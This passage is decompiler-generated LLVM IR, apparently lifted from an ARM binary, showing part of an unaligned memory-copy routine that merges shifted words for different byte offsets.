.thread126:                                       ; preds = %dec_label_pc_1a4dc, %bb145
  %v7_1a4f8 = phi i32 [ %v8_1a4f0, %bb145 ], [ %v5_1a4e8, %dec_label_pc_1a4dc ]
  %v2_1a4f8 = phi i1 [ %v2_1a4f4.pre, %bb145 ], [ %v1_1a4ec, %dec_label_pc_1a4dc ]
  %v1_1a4f8 = phi i1 [ %v1_1a4f4.pre, %bb145 ], [ %v0_1a4ec, %dec_label_pc_1a4dc ]
  %v0_1a4f4 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_1a4f4 = xor i1 %v2_1a4f8, %v1_1a4f8
  %v4_1a4f4 = or i1 %v0_1a4f4, %v3_1a4f4
  br i1 %v4_1a4f4, label %.thread127, label %bb146

bb146:                                            ; preds = %.thread126
  %v5_1a4f4 = load i32, i32* %r1.global-to-local, align 4
  %v6_1a4f4 = inttoptr i32 %v5_1a4f4 to i8*
  %v7_1a4f4 = load i8, i8* %v6_1a4f4, align 1
  %v8_1a4f4 = zext i8 %v7_1a4f4 to i32
  store i32 %v8_1a4f4, i32* @r3, align 4
  %v10_1a4f4 = add i32 %v5_1a4f4, 1
  store i32 %v10_1a4f4, i32* %r1.global-to-local, align 4
  %v8_1a4f8 = inttoptr i32 %v7_1a4f8 to i8*
  store i8 %v7_1a4f4, i8* %v8_1a4f8, align 1
  %v9_1a4f8 = load i32, i32* %r0.global-to-local, align 4
  %v10_1a4f8 = add i32 %v9_1a4f8, 1
  store i32 %v10_1a4f8, i32* %r0.global-to-local, align 4
  br label %.thread127

.thread127:                                       ; preds = %.thread126, %bb146
  %v0_1a62c76 = phi i32 [ %v10_1a4f8, %bb146 ], [ %v7_1a4f8, %.thread126 ]
  %v0_1a4fc = load i32, i32* %r2.global-to-local, align 4
  %v1_1a4fc = load i32, i32* @ip, align 4
  %v2_1a4fc = sub i32 %v0_1a4fc, %v1_1a4fc
  store i32 %v2_1a4fc, i32* %r2.global-to-local, align 4
  %v4_1a4fc = xor i32 %v1_1a4fc, %v0_1a4fc
  %v5_1a4fc = xor i32 %v2_1a4fc, %v0_1a4fc
  %v6_1a4fc = and i32 %v5_1a4fc, %v4_1a4fc
  %v7_1a4fc = icmp slt i32 %v6_1a4fc, 0
  store i1 %v7_1a4fc, i1* %cpsr_v.global-to-local, align 1
  %v8_1a4fc = icmp slt i32 %v2_1a4fc, 0
  store i1 %v8_1a4fc, i1* %cpsr_n.global-to-local, align 1
  %v9_1a4fc = icmp eq i32 %v0_1a4fc, %v1_1a4fc
  store i1 %v9_1a4fc, i1* %cpsr_z.global-to-local, align 1
  %v2_1a500 = xor i1 %v8_1a4fc, %v7_1a4fc
  br i1 %v2_1a500, label %bb140, label %dec_label_pc_1a504

dec_label_pc_1a504:                               ; preds = %.thread127
  %v0_1a504 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a504 = urem i32 %v0_1a504, 4
  store i32 %v1_1a504, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1a504 = icmp eq i32 %v1_1a504, 0
  store i1 %v2_1a504, i1* %cpsr_z.global-to-local, align 1
  %extract.t130 = trunc i32 %v0_1a504 to i2
  br i1 %v2_1a504, label %dec_label_pc_1a438, label %dec_label_pc_1a50c

dec_label_pc_1a50c:                               ; preds = %dec_label_pc_1a430, %dec_label_pc_1a504
  %v0_1a62c75 = phi i32 [ %v1_1a410, %dec_label_pc_1a430 ], [ %v0_1a62c76, %dec_label_pc_1a504 ]
  %v0_1a594 = phi i32 [ %v2_1a420, %dec_label_pc_1a430 ], [ %v2_1a4fc, %dec_label_pc_1a504 ]
  %v0_1a514.off0 = phi i2 [ %extract.t, %dec_label_pc_1a430 ], [ %extract.t130, %dec_label_pc_1a504 ]
  %v0_1a50c = phi i32 [ %v0_1a410, %dec_label_pc_1a430 ], [ %v0_1a504, %dec_label_pc_1a504 ]
  %v1_1a50c = and i32 %v0_1a50c, -4
  store i32 %v1_1a50c, i32* %r1.global-to-local, align 4
  %v1_1a510 = inttoptr i32 %v1_1a50c to i32*
  %v2_1a510 = load i32, i32* %v1_1a510, align 4
  store i32 %v2_1a510, i32* %lr.global-to-local, align 4
  %v4_1a510 = add i32 %v1_1a50c, 4
  store i32 %v4_1a510, i32* %r1.global-to-local, align 4
  %v1_1a58c = add i32 %v0_1a594, -12
  %v3_1a58c = sub i32 11, %v0_1a594
  %v4_1a58c = and i32 %v3_1a58c, %v0_1a594
  %v5_1a58c = icmp slt i32 %v4_1a58c, 0
  store i1 %v5_1a58c, i1* %cpsr_v.global-to-local, align 1
  %v6_1a58c = icmp slt i32 %v1_1a58c, 0
  store i1 %v6_1a58c, i1* %cpsr_n.global-to-local, align 1
  %v7_1a58c = icmp eq i32 %v0_1a594, 12
  store i1 %v7_1a58c, i1* %cpsr_z.global-to-local, align 1
  %v2_1a590 = xor i1 %v6_1a58c, %v5_1a58c
  switch i2 %v0_1a514.off0, label %dec_label_pc_1a520 [
    i2 -1, label %dec_label_pc_1a5f8
    i2 -2, label %dec_label_pc_1a58c
  ]

dec_label_pc_1a520:                               ; preds = %dec_label_pc_1a50c
  br i1 %v2_1a590, label %dec_label_pc_1a56c, label %dec_label_pc_1a528

dec_label_pc_1a528:                               ; preds = %dec_label_pc_1a520
  store i32 %v1_1a58c, i32* %r2.global-to-local, align 4
  %v3_1a52c = load i32, i32* @r4, align 4
  store i32 %v3_1a52c, i32* %stack_var_-16, align 4
  %v6_1a52c = load i32, i32* @r5, align 4
  store i32 %v6_1a52c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1a530

dec_label_pc_1a530:                               ; preds = %dec_label_pc_1a530.dec_label_pc_1a530_crit_edge, %dec_label_pc_1a528
  %v0_1a554 = phi i32 [ %v12_1a554, %dec_label_pc_1a530.dec_label_pc_1a530_crit_edge ], [ %v0_1a62c75, %dec_label_pc_1a528 ]
  %v0_1a534 = phi i32 [ %v0_1a534.pre, %dec_label_pc_1a530.dec_label_pc_1a530_crit_edge ], [ %v4_1a510, %dec_label_pc_1a528 ]
  %v0_1a530 = phi i32 [ %v0_1a530.pre, %dec_label_pc_1a530.dec_label_pc_1a530_crit_edge ], [ %v2_1a510, %dec_label_pc_1a528 ]
  %v3_1a530 = udiv i32 %v0_1a530, 256
  %v1_1a534 = inttoptr i32 %v0_1a534 to i32*
  %v2_1a534 = load i32, i32* %v1_1a534, align 4
  store i32 %v2_1a534, i32* %r4.global-to-local, align 4
  %v3_1a534 = add i32 %v0_1a534, 4
  %v4_1a534 = inttoptr i32 %v3_1a534 to i32*
  %v5_1a534 = load i32, i32* %v4_1a534, align 4
  store i32 %v5_1a534, i32* %r5.global-to-local, align 4
  %v6_1a534 = add i32 %v0_1a534, 8
  %v7_1a534 = inttoptr i32 %v6_1a534 to i32*
  %v8_1a534 = load i32, i32* %v7_1a534, align 4
  store i32 %v8_1a534, i32* %ip.global-to-local, align 4
  %v9_1a534 = add i32 %v0_1a534, 12
  %v10_1a534 = inttoptr i32 %v9_1a534 to i32*
  %v11_1a534 = load i32, i32* %v10_1a534, align 4
  store i32 %v11_1a534, i32* %lr.global-to-local, align 4
  %v12_1a534 = add i32 %v0_1a534, 16
  store i32 %v12_1a534, i32* %r1.global-to-local, align 4
  %v4_1a538 = mul i32 %v2_1a534, 16777216
  %v5_1a538 = or i32 %v4_1a538, %v3_1a530
  store i32 %v5_1a538, i32* @r3, align 4
  %v3_1a53c = udiv i32 %v2_1a534, 256
  %v4_1a540 = mul i32 %v5_1a534, 16777216
  %v5_1a540 = or i32 %v4_1a540, %v3_1a53c
  store i32 %v5_1a540, i32* %r4.global-to-local, align 4
  %v3_1a544 = udiv i32 %v5_1a534, 256
  %v4_1a548 = mul i32 %v8_1a534, 16777216
  %v5_1a548 = or i32 %v4_1a548, %v3_1a544
  store i32 %v5_1a548, i32* %r5.global-to-local, align 4
  %v3_1a54c = udiv i32 %v8_1a534, 256
  %v4_1a550 = mul i32 %v11_1a534, 16777216
  %v5_1a550 = or i32 %v4_1a550, %v3_1a54c
  store i32 %v5_1a550, i32* @ip, align 4
  %v1_1a554 = inttoptr i32 %v0_1a554 to i32*
  store i32 %v5_1a538, i32* %v1_1a554, align 4
  %v3_1a554 = add i32 %v0_1a554, 4
  %v4_1a554 = inttoptr i32 %v3_1a554 to i32*
  %v5_1a554 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1a554, i32* %v4_1a554, align 4
  %v6_1a554 = add i32 %v0_1a554, 8
  %v7_1a554 = inttoptr i32 %v6_1a554 to i32*
  %v8_1a554 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_1a554, i32* %v7_1a554, align 4
  %v9_1a554 = add i32 %v0_1a554, 12
  %v10_1a554 = inttoptr i32 %v9_1a554 to i32*
  %v11_1a554 = load i32, i32* @ip, align 4
  store i32 %v11_1a554, i32* %v10_1a554, align 4
  %v12_1a554 = add i32 %v0_1a554, 16
  store i32 %v12_1a554, i32* %r0.global-to-local, align 4
  %v0_1a558 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a558 = add i32 %v0_1a558, -16
  store i32 %v1_1a558, i32* %r2.global-to-local, align 4
  %v3_1a558 = sub i32 15, %v0_1a558
  %v4_1a558 = and i32 %v3_1a558, %v0_1a558
  %v5_1a558 = icmp slt i32 %v4_1a558, 0
  %v6_1a558 = icmp slt i32 %v1_1a558, 0
  %v2_1a55c = xor i1 %v6_1a558, %v5_1a558
  br i1 %v2_1a55c, label %dec_label_pc_1a560, label %dec_label_pc_1a530.dec_label_pc_1a530_crit_edge

dec_label_pc_1a530.dec_label_pc_1a530_crit_edge:  ; preds = %dec_label_pc_1a530
  %v0_1a530.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1a534.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a530

dec_label_pc_1a560:                               ; preds = %dec_label_pc_1a530
  %v2_1a560 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1a560, i32* @r4, align 4
  %v5_1a560 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_1a560, i32* @r5, align 4
  %v1_1a564 = add i32 %v0_1a558, -4
  store i32 %v1_1a564, i32* %r2.global-to-local, align 4
  %v3_1a564 = add i32 %v0_1a558, 2147483632
  %v4_1a564 = and i32 %v1_1a564, %v3_1a564
  %v5_1a564 = icmp slt i32 %v4_1a564, 0
  store i1 %v5_1a564, i1* %cpsr_v.global-to-local, align 1
  %v6_1a564 = icmp slt i32 %v1_1a564, 0
  store i1 %v6_1a564, i1* %cpsr_n.global-to-local, align 1
  %v7_1a564 = icmp eq i32 %v1_1a564, 0
  store i1 %v7_1a564, i1* %cpsr_z.global-to-local, align 1
  %v2_1a568 = xor i1 %v6_1a564, %v5_1a564
  br i1 %v2_1a568, label %dec_label_pc_1a584, label %dec_label_pc_1a56c

dec_label_pc_1a56c:                               ; preds = %dec_label_pc_1a560, %dec_label_pc_1a520, %dec_label_pc_1a56c
  %v1_1a578 = phi i32 [ %v4_1a578, %dec_label_pc_1a56c ], [ %v12_1a554, %dec_label_pc_1a560 ], [ %v0_1a62c75, %dec_label_pc_1a520 ]
  %v0_1a56c = load i32, i32* %lr.global-to-local, align 4
  %v3_1a56c = udiv i32 %v0_1a56c, 256
  store i32 %v3_1a56c, i32* %ip.global-to-local, align 4
  %v0_1a570 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a570 = inttoptr i32 %v0_1a570 to i32*
  %v2_1a570 = load i32, i32* %v1_1a570, align 4
  store i32 %v2_1a570, i32* %lr.global-to-local, align 4
  %v4_1a570 = add i32 %v0_1a570, 4
  store i32 %v4_1a570, i32* %r1.global-to-local, align 4
  %v4_1a574 = mul i32 %v2_1a570, 16777216
  %v5_1a574 = or i32 %v4_1a574, %v3_1a56c
  store i32 %v5_1a574, i32* @ip, align 4
  %v2_1a578 = inttoptr i32 %v1_1a578 to i32*
  store i32 %v5_1a574, i32* %v2_1a578, align 4
  %v3_1a578 = load i32, i32* %r0.global-to-local, align 4
  %v4_1a578 = add i32 %v3_1a578, 4
  store i32 %v4_1a578, i32* %r0.global-to-local, align 4
  %v0_1a57c = load i32, i32* %r2.global-to-local, align 4
  %v1_1a57c = add i32 %v0_1a57c, -4
  store i32 %v1_1a57c, i32* %r2.global-to-local, align 4
  %v3_1a57c = sub i32 3, %v0_1a57c
  %v4_1a57c = and i32 %v3_1a57c, %v0_1a57c
  %v5_1a57c = icmp slt i32 %v4_1a57c, 0
  %v6_1a57c = icmp slt i32 %v1_1a57c, 0
  %v2_1a580 = xor i1 %v6_1a57c, %v5_1a57c
  br i1 %v2_1a580, label %dec_label_pc_1a584.loopexit, label %dec_label_pc_1a56c

dec_label_pc_1a584.loopexit:                      ; preds = %dec_label_pc_1a56c
  %v7_1a57c = icmp eq i32 %v0_1a57c, 4
  store i1 %v5_1a57c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_1a57c, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_1a57c, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1a584

dec_label_pc_1a584:                               ; preds = %dec_label_pc_1a584.loopexit, %dec_label_pc_1a560
  %v0_1a4ac58 = phi i32 [ %v1_1a57c, %dec_label_pc_1a584.loopexit ], [ %v1_1a564, %dec_label_pc_1a560 ]
  %v0_1a584 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a584 = add i32 %v0_1a584, -3
  store i32 %v1_1a584, i32* %r1.global-to-local, align 4
  br label %bb140

dec_label_pc_1a58c:                               ; preds = %dec_label_pc_1a50c
  br i1 %v2_1a590, label %dec_label_pc_1a5d8, label %dec_label_pc_1a594

dec_label_pc_1a594:                               ; preds = %dec_label_pc_1a58c
  store i32 %v1_1a58c, i32* %r2.global-to-local, align 4
  %v3_1a598 = load i32, i32* @r4, align 4
  store i32 %v3_1a598, i32* %stack_var_-16, align 4
  %v6_1a598 = load i32, i32* @r5, align 4
  store i32 %v6_1a598, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1a59c

dec_label_pc_1a59c:                               ; preds = %dec_label_pc_1a59c.dec_label_pc_1a59c_crit_edge, %dec_label_pc_1a594
  %v0_1a5c0 = phi i32 [ %v12_1a5c0, %dec_label_pc_1a59c.dec_label_pc_1a59c_crit_edge ], [ %v0_1a62c75, %dec_label_pc_1a594 ]
  %v0_1a5a0 = phi i32 [ %v0_1a5a0.pre, %dec_label_pc_1a59c.dec_label_pc_1a59c_crit_edge ], [ %v4_1a510, %dec_label_pc_1a594 ]
  %v0_1a59c = phi i32 [ %v0_1a59c.pre, %dec_label_pc_1a59c.dec_label_pc_1a59c_crit_edge ], [ %v2_1a510, %dec_label_pc_1a594 ]
  %v3_1a59c = udiv i32 %v0_1a59c, 65536
  %v1_1a5a0 = inttoptr i32 %v0_1a5a0 to i32*
  %v2_1a5a0 = load i32, i32* %v1_1a5a0, align 4
  store i32 %v2_1a5a0, i32* %r4.global-to-local, align 4
  %v3_1a5a0 = add i32 %v0_1a5a0, 4
  %v4_1a5a0 = inttoptr i32 %v3_1a5a0 to i32*
  %v5_1a5a0 = load i32, i32* %v4_1a5a0, align 4
  store i32 %v5_1a5a0, i32* %r5.global-to-local, align 4
  %v6_1a5a0 = add i32 %v0_1a5a0, 8
  %v7_1a5a0 = inttoptr i32 %v6_1a5a0 to i32*
  %v8_1a5a0 = load i32, i32* %v7_1a5a0, align 4
  store i32 %v8_1a5a0, i32* %ip.global-to-local, align 4
  %v9_1a5a0 = add i32 %v0_1a5a0, 12
  %v10_1a5a0 = inttoptr i32 %v9_1a5a0 to i32*
  %v11_1a5a0 = load i32, i32* %v10_1a5a0, align 4
  store i32 %v11_1a5a0, i32* %lr.global-to-local, align 4
  %v12_1a5a0 = add i32 %v0_1a5a0, 16
  store i32 %v12_1a5a0, i32* %r1.global-to-local, align 4
  %v4_1a5a4 = mul i32 %v2_1a5a0, 65536
  %v5_1a5a4 = or i32 %v4_1a5a4, %v3_1a59c
  store i32 %v5_1a5a4, i32* @r3, align 4
  %v3_1a5a8 = udiv i32 %v2_1a5a0, 65536
  %v4_1a5ac = mul i32 %v5_1a5a0, 65536
  %v5_1a5ac = or i32 %v4_1a5ac, %v3_1a5a8
  store i32 %v5_1a5ac, i32* %r4.global-to-local, align 4
  %v3_1a5b0 = udiv i32 %v5_1a5a0, 65536
  %v4_1a5b4 = mul i32 %v8_1a5a0, 65536
  %v5_1a5b4 = or i32 %v4_1a5b4, %v3_1a5b0
  store i32 %v5_1a5b4, i32* %r5.global-to-local, align 4
  %v3_1a5b8 = udiv i32 %v8_1a5a0, 65536
  %v4_1a5bc = mul i32 %v11_1a5a0, 65536
  %v5_1a5bc = or i32 %v4_1a5bc, %v3_1a5b8
  store i32 %v5_1a5bc, i32* @ip, align 4
  %v1_1a5c0 = inttoptr i32 %v0_1a5c0 to i32*
  store i32 %v5_1a5a4, i32* %v1_1a5c0, align 4
  %v3_1a5c0 = add i32 %v0_1a5c0, 4
  %v4_1a5c0 = inttoptr i32 %v3_1a5c0 to i32*
  %v5_1a5c0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1a5c0, i32* %v4_1a5c0, align 4
  %v6_1a5c0 = add i32 %v0_1a5c0, 8
  %v7_1a5c0 = inttoptr i32 %v6_1a5c0 to i32*
  %v8_1a5c0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_1a5c0, i32* %v7_1a5c0, align 4
  %v9_1a5c0 = add i32 %v0_1a5c0, 12
  %v10_1a5c0 = inttoptr i32 %v9_1a5c0 to i32*
  %v11_1a5c0 = load i32, i32* @ip, align 4
  store i32 %v11_1a5c0, i32* %v10_1a5c0, align 4
  %v12_1a5c0 = add i32 %v0_1a5c0, 16
  store i32 %v12_1a5c0, i32* %r0.global-to-local, align 4
  %v0_1a5c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a5c4 = add i32 %v0_1a5c4, -16
  store i32 %v1_1a5c4, i32* %r2.global-to-local, align 4
  %v3_1a5c4 = sub i32 15, %v0_1a5c4
  %v4_1a5c4 = and i32 %v3_1a5c4, %v0_1a5c4
  %v5_1a5c4 = icmp slt i32 %v4_1a5c4, 0
  %v6_1a5c4 = icmp slt i32 %v1_1a5c4, 0
  %v2_1a5c8 = xor i1 %v6_1a5c4, %v5_1a5c4
  br i1 %v2_1a5c8, label %dec_label_pc_1a5cc, label %dec_label_pc_1a59c.dec_label_pc_1a59c_crit_edge

dec_label_pc_1a59c.dec_label_pc_1a59c_crit_edge:  ; preds = %dec_label_pc_1a59c
  %v0_1a59c.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1a5a0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a59c

dec_label_pc_1a5cc:                               ; preds = %dec_label_pc_1a59c
  %v2_1a5cc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1a5cc, i32* @r4, align 4
  %v5_1a5cc = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_1a5cc, i32* @r5, align 4
  %v1_1a5d0 = add i32 %v0_1a5c4, -4
  store i32 %v1_1a5d0, i32* %r2.global-to-local, align 4
  %v3_1a5d0 = add i32 %v0_1a5c4, 2147483632
  %v4_1a5d0 = and i32 %v1_1a5d0, %v3_1a5d0
  %v5_1a5d0 = icmp slt i32 %v4_1a5d0, 0
  store i1 %v5_1a5d0, i1* %cpsr_v.global-to-local, align 1
  %v6_1a5d0 = icmp slt i32 %v1_1a5d0, 0
  store i1 %v6_1a5d0, i1* %cpsr_n.global-to-local, align 1
  %v7_1a5d0 = icmp eq i32 %v1_1a5d0, 0
  store i1 %v7_1a5d0, i1* %cpsr_z.global-to-local, align 1
  %v2_1a5d4 = xor i1 %v6_1a5d0, %v5_1a5d0
  br i1 %v2_1a5d4, label %dec_label_pc_1a5f0, label %dec_label_pc_1a5d8

dec_label_pc_1a5d8:                               ; preds = %dec_label_pc_1a5cc, %dec_label_pc_1a58c, %dec_label_pc_1a5d8
  %v1_1a5e4 = phi i32 [ %v4_1a5e4, %dec_label_pc_1a5d8 ], [ %v12_1a5c0, %dec_label_pc_1a5cc ], [ %v0_1a62c75, %dec_label_pc_1a58c ]
  %v0_1a5d8 = load i32, i32* %lr.global-to-local, align 4
  %v3_1a5d8 = udiv i32 %v0_1a5d8, 65536
  store i32 %v3_1a5d8, i32* %ip.global-to-local, align 4
  %v0_1a5dc = load i32, i32* %r1.global-to-local, align 4
  %v1_1a5dc = inttoptr i32 %v0_1a5dc to i32*
  %v2_1a5dc = load i32, i32* %v1_1a5dc, align 4
  store i32 %v2_1a5dc, i32* %lr.global-to-local, align 4
  %v4_1a5dc = add i32 %v0_1a5dc, 4
  store i32 %v4_1a5dc, i32* %r1.global-to-local, align 4
  %v4_1a5e0 = mul i32 %v2_1a5dc, 65536
  %v5_1a5e0 = or i32 %v4_1a5e0, %v3_1a5d8
  store i32 %v5_1a5e0, i32* @ip, align 4
  %v2_1a5e4 = inttoptr i32 %v1_1a5e4 to i32*
  store i32 %v5_1a5e0, i32* %v2_1a5e4, align 4
  %v3_1a5e4 = load i32, i32* %r0.global-to-local, align 4
  %v4_1a5e4 = add i32 %v3_1a5e4, 4
  store i32 %v4_1a5e4, i32* %r0.global-to-local, align 4
  %v0_1a5e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a5e8 = add i32 %v0_1a5e8, -4
  store i32 %v1_1a5e8, i32* %r2.global-to-local, align 4
  %v3_1a5e8 = sub i32 3, %v0_1a5e8
  %v4_1a5e8 = and i32 %v3_1a5e8, %v0_1a5e8
  %v5_1a5e8 = icmp slt i32 %v4_1a5e8, 0
  %v6_1a5e8 = icmp slt i32 %v1_1a5e8, 0
  %v2_1a5ec = xor i1 %v6_1a5e8, %v5_1a5e8
  br i1 %v2_1a5ec, label %dec_label_pc_1a5f0.loopexit, label %dec_label_pc_1a5d8

dec_label_pc_1a5f0.loopexit:                      ; preds = %dec_label_pc_1a5d8
  %v7_1a5e8 = icmp eq i32 %v0_1a5e8, 4
  store i1 %v5_1a5e8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_1a5e8, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_1a5e8, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1a5f0

dec_label_pc_1a5f0:                               ; preds = %dec_label_pc_1a5f0.loopexit, %dec_label_pc_1a5cc
  %v0_1a4ac59 = phi i32 [ %v1_1a5e8, %dec_label_pc_1a5f0.loopexit ], [ %v1_1a5d0, %dec_label_pc_1a5cc ]
  %v0_1a5f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a5f0 = add i32 %v0_1a5f0, -2
  store i32 %v1_1a5f0, i32* %r1.global-to-local, align 4
  br label %bb140

dec_label_pc_1a5f8:                               ; preds = %dec_label_pc_1a50c
  br i1 %v2_1a590, label %dec_label_pc_1a644, label %dec_label_pc_1a600

dec_label_pc_1a600:                               ; preds = %dec_label_pc_1a5f8
  store i32 %v1_1a58c, i32* %r2.global-to-local, align 4
  %v3_1a604 = load i32, i32* @r4, align 4
  store i32 %v3_1a604, i32* %stack_var_-16, align 4
  %v6_1a604 = load i32, i32* @r5, align 4
  store i32 %v6_1a604, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1a608

dec_label_pc_1a608:                               ; preds = %dec_label_pc_1a608.dec_label_pc_1a608_crit_edge, %dec_label_pc_1a600
  %v0_1a62c = phi i32 [ %v12_1a62c, %dec_label_pc_1a608.dec_label_pc_1a608_crit_edge ], [ %v0_1a62c75, %dec_label_pc_1a600 ]
  %v0_1a60c = phi i32 [ %v0_1a60c.pre, %dec_label_pc_1a608.dec_label_pc_1a608_crit_edge ], [ %v4_1a510, %dec_label_pc_1a600 ]
  %v0_1a608 = phi i32 [ %v0_1a608.pre, %dec_label_pc_1a608.dec_label_pc_1a608_crit_edge ], [ %v2_1a510, %dec_label_pc_1a600 ]
  %v3_1a608 = udiv i32 %v0_1a608, 16777216
  %v1_1a60c = inttoptr i32 %v0_1a60c to i32*
  %v2_1a60c = load i32, i32* %v1_1a60c, align 4
  store i32 %v2_1a60c, i32* %r4.global-to-local, align 4
  %v3_1a60c = add i32 %v0_1a60c, 4
  %v4_1a60c = inttoptr i32 %v3_1a60c to i32*
  %v5_1a60c = load i32, i32* %v4_1a60c, align 4
  store i32 %v5_1a60c, i32* %r5.global-to-local, align 4
  %v6_1a60c = add i32 %v0_1a60c, 8
  %v7_1a60c = inttoptr i32 %v6_1a60c to i32*
  %v8_1a60c = load i32, i32* %v7_1a60c, align 4
  store i32 %v8_1a60c, i32* %ip.global-to-local, align 4
  %v9_1a60c = add i32 %v0_1a60c, 12
  %v10_1a60c = inttoptr i32 %v9_1a60c to i32*
  %v11_1a60c = load i32, i32* %v10_1a60c, align 4
  store i32 %v11_1a60c, i32* %lr.global-to-local, align 4
  %v12_1a60c = add i32 %v0_1a60c, 16
  store i32 %v12_1a60c, i32* %r1.global-to-local, align 4
  %v4_1a610 = mul i32 %v2_1a60c, 256
  %v5_1a610 = or i32 %v4_1a610, %v3_1a608
  store i32 %v5_1a610, i32* @r3, align 4
  %v3_1a614 = udiv i32 %v2_1a60c, 16777216
  %v4_1a618 = mul i32 %v5_1a60c, 256
  %v5_1a618 = or i32 %v4_1a618, %v3_1a614
  store i32 %v5_1a618, i32* %r4.global-to-local, align 4
  %v3_1a61c = udiv i32 %v5_1a60c, 16777216
  %v4_1a620 = mul i32 %v8_1a60c, 256
  %v5_1a620 = or i32 %v4_1a620, %v3_1a61c
  store i32 %v5_1a620, i32* %r5.global-to-local, align 4
  %v3_1a624 = udiv i32 %v8_1a60c, 16777216
  %v4_1a628 = mul i32 %v11_1a60c, 256
  %v5_1a628 = or i32 %v4_1a628, %v3_1a624
  store i32 %v5_1a628, i32* @ip, align 4
  %v1_1a62c = inttoptr i32 %v0_1a62c to i32*
  store i32 %v5_1a610, i32* %v1_1a62c, align 4
  %v3_1a62c = add i32 %v0_1a62c, 4
  %v4_1a62c = inttoptr i32 %v3_1a62c to i32*
  %v5_1a62c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1a62c, i32* %v4_1a62c, align 4
  %v6_1a62c = add i32 %v0_1a62c, 8
  %v7_1a62c = inttoptr i32 %v6_1a62c to i32*
  %v8_1a62c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_1a62c, i32* %v7_1a62c, align 4
  %v9_1a62c = add i32 %v0_1a62c, 12
  %v10_1a62c = inttoptr i32 %v9_1a62c to i32*
  %v11_1a62c = load i32, i32* @ip, align 4
  store i32 %v11_1a62c, i32* %v10_1a62c, align 4
  %v12_1a62c = add i32 %v0_1a62c, 16
  store i32 %v12_1a62c, i32* %r0.global-to-local, align 4
  %v0_1a630 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a630 = add i32 %v0_1a630, -16
  store i32 %v1_1a630, i32* %r2.global-to-local, align 4
  %v3_1a630 = sub i32 15, %v0_1a630
  %v4_1a630 = and i32 %v3_1a630, %v0_1a630
  %v5_1a630 = icmp slt i32 %v4_1a630, 0
  %v6_1a630 = icmp slt i32 %v1_1a630, 0
  %v2_1a634 = xor i1 %v6_1a630, %v5_1a630
  br i1 %v2_1a634, label %dec_label_pc_1a638, label %dec_label_pc_1a608.dec_label_pc_1a608_crit_edge

dec_label_pc_1a608.dec_label_pc_1a608_crit_edge:  ; preds = %dec_label_pc_1a608
  %v0_1a608.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1a60c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a608

dec_label_pc_1a638:                               ; preds = %dec_label_pc_1a608
  %v2_1a638 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1a638, i32* @r4, align 4
  %v5_1a638 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_1a638, i32* @r5, align 4
  %v1_1a63c = add i32 %v0_1a630, -4
  store i32 %v1_1a63c, i32* %r2.global-to-local, align 4
  %v3_1a63c = add i32 %v0_1a630, 2147483632
  %v4_1a63c = and i32 %v1_1a63c, %v3_1a63c
  %v5_1a63c = icmp slt i32 %v4_1a63c, 0
  store i1 %v5_1a63c, i1* %cpsr_v.global-to-local, align 1
  %v6_1a63c = icmp slt i32 %v1_1a63c, 0
  store i1 %v6_1a63c, i1* %cpsr_n.global-to-local, align 1
  %v7_1a63c = icmp eq i32 %v1_1a63c, 0
  store i1 %v7_1a63c, i1* %cpsr_z.global-to-local, align 1
  %v2_1a640 = xor i1 %v6_1a63c, %v5_1a63c
  br i1 %v2_1a640, label %dec_label_pc_1a65c, label %dec_label_pc_1a644

dec_label_pc_1a644:                               ; preds = %dec_label_pc_1a638, %dec_label_pc_1a5f8, %dec_label_pc_1a644
  %v1_1a650 = phi i32 [ %v4_1a650, %dec_label_pc_1a644 ], [ %v12_1a62c, %dec_label_pc_1a638 ], [ %v0_1a62c75, %dec_label_pc_1a5f8 ]
  %v0_1a644 = load i32, i32* %lr.global-to-local, align 4
  %v3_1a644 = udiv i32 %v0_1a644, 16777216
  store i32 %v3_1a644, i32* %ip.global-to-local, align 4
  %v0_1a648 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a648 = inttoptr i32 %v0_1a648 to i32*
  %v2_1a648 = load i32, i32* %v1_1a648, align 4
  store i32 %v2_1a648, i32* %lr.global-to-local, align 4
  %v4_1a648 = add i32 %v0_1a648, 4
  store i32 %v4_1a648, i32* %r1.global-to-local, align 4
  %v4_1a64c = mul i32 %v2_1a648, 256
  %v5_1a64c = or i32 %v4_1a64c, %v3_1a644
  store i32 %v5_1a64c, i32* @ip, align 4
  %v2_1a650 = inttoptr i32 %v1_1a650 to i32*
  store i32 %v5_1a64c, i32* %v2_1a650, align 4
